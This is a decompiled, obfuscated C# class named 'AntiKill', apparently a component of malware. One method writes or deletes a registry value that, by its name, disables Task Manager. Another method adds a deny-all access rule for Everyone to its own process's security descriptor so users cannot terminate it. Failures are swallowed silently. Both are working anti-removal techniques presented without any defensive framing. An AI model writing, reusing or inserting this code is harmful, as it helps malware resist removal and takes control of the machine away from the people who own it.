using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace Complex;

internal sealed class AntiKill
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void DisTaskManager(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107404878));
			if (bool_0 && registryKey.GetValue(getString_0(107404833)) != null)
			{
				registryKey.DeleteValue(getString_0(107404833));
			}
			else
			{
				registryKey.SetValue(getString_0(107404833), getString_0(107407236));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr intptr_0)
	{
		byte[] pSecurityDescriptor = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
		if ((long)lpnLengthNeeded > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
		{
			return null;
		}
		return new RawSecurityDescriptor(pSecurityDescriptor, 0);
	}

	private void SetProcessSecurityDescriptor(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void IamInmortal()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
			processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static AntiKill()
	{
		Strings.CreateGetStringDelegate(typeof(AntiKill));
	}
}
